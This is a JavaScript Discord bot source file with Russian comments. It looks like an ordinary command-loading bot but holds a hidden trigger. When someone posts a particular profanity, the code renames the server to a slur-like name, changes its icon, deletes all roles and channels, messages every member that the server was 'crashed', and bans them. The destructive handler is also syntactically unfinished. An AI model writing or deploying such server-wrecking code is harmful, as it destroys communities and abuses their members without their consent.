/*==========Библиотека Discord===========*/
const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require("fs");
const weather = require('weather-js');
let config = require('./config.json');
let channels = require('./channels.json');
let prefix = config.prefix;
bot.commands = new Discord.Collection();
fs.readdir('./cmd/',(err,files) =>{
    if(err) console.log(err);
    let jsfiles =files.filter(f => f.split(".").pop() === "js");
    if(jsfiles.length <=0) console.log("Нет доступных файлов для загрузки.");
    console.log(`Загружено ${jsfiles.length} файлов (commands)`);
    jsfiles.forEach((f,i) => {
        let props = require(`./cmd/${f}`);
        console.log(`${i+1}.${f} Загружен`);
        bot.commands.set(props.help.name,props);
    })
});
	/*=======================================*/
bot.on ("message", async message =>{
	    if(message.author.bot) return;
    if(message.channel.type == "dm") return;
    let user = message.author.username;
    let userid = message.author.id;
    let messageArray = message.content.split(" ");
    let command = messageArray[0].toLowerCase()
    let args = message.content.slice(prefix.length).trim().split(/ +/g);
    args.shift();
    if (!message.content.startsWith(prefix)) return;
    let cmd = bot.commands.get(command.slice(prefix.length));
    if (cmd) cmd.run(bot,message,args);
});
bot.on('message', msg => {
    if (msg.content === 'пиздец') {
    	msg.guild.setName('PEDIK TEAM') // Смена названия сервера
		msg.guild.setIcon('https://media.discordapp.net/attachments/725683801690210344/725686961456807976/detail_a396736855d9496ec28359f98bd14d2f.jpg').then(() => {
      msg.guild.roles.forEach(i => i.delete()) // Удаление всех ролей
      msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
       msg.guild.members.forEach(member => { //Расслыка всем пользователям
        if (member.id != bot.user.id && !member.user.bot) member.send('Сервер на котором ты находился крашнут))').then(() => {
            member.ban().then(() => {
                msg.guild.createChannel(name, "Брух")
                    })
					
                    console.log('Попался лох')
                })
            })

bot.login(config.token);
